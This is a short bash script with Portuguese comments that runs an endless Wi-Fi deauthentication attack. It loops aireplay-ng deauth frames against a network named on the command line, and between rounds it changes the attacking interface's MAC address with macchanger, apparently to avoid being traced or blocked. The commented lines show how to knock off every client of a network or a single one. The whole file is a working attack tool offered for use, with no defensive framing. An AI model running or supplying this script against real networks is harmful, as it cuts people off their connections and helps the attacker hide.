#!/bin/bash
#-0 deaut ; 2 = n de deauth request ; -a = rede; -c =cliente
#-e = nome rede ; $1 = primeiro argumento
#todos
#aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF wlan1mon;
#especifico
#aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF wlan1mon -c FF:EE:DD:CC:BB:AA;

#./deauth.sh nomeRede

while true
do
	aireplay-ng -0 1 -e $1 wlan0 | grep "DeAuth"
	ifconfig wlan1mon down
	macchanger -r wlan1mon | grep "New Mac"
	ifconfig wlan1mon up
	sleep 3
done
